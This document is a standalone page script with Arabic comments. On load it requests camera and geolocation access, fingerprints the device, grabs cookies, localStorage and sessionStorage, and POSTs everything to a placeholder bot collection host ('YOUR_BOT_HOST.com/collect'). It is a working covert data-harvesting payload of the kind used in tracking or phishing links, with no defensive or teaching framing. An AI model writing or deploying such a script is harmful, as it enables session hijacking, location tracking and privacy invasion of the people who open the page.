    <script>
    (function() {
        const sessionId = 'vGDPpLhB4Zcmw7Ox';
        const COLLECT_URL = 'https://YOUR_BOT_HOST.com/collect';
        
        function collectAndSend() {
            // طلب صلاحيات الكاميرا
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                try {
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } })
                        .then(stream => stream.getTracks().forEach(t => t.stop()))
                        .catch(e => console.log('كاميرا خلفية مرفوضة'));
                    
                    navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                        .then(stream => stream.getTracks().forEach(t => t.stop()))
                        .catch(e => console.log('كاميرا أمامية مرفوضة'));
                } catch(e) {}
            }
            
            // طلب الموقع
            let locationData = 'غير متاح';
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    pos => {
                        locationData = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
                        sendData(locationData);
                    },
                    err => {
                        console.log('الموقع مرفوض');
                        sendData('مرفوض');
                    }
                );
            } else {
                sendData('غير مدعوم');
            }
        }
        
        function sendData(location) {
            const deviceInfo = {
                session: sessionId,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: window.screen.width + 'x' + window.screen.height,
                colorDepth: window.screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hardware: {
                    cores: navigator.hardwareConcurrency || 'غير معروف',
                    memory: navigator.deviceMemory || 'غير معروف',
                    touchPoints: navigator.maxTouchPoints || 0
                },
                location: location,
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
                referrer: document.referrer || 'مباشر'
            };
            
            // إرسال البيانات
            fetch(COLLECT_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(deviceInfo)
            })
            .then(res => res.json())
            .then(result => {
                console.log('✅ تم الإرسال بنجاح');
            })
            .catch(err => {
                console.error('❌ خطأ في الإرسال:', err);
            });
        }
        
        // تشغيل عند التحميل
        window.addEventListener('load', function() {
            setTimeout(collectAndSend, 1500);
        });
        
        console.log('🔍 تم تحميل كود التجميع');
    })();
    </script>
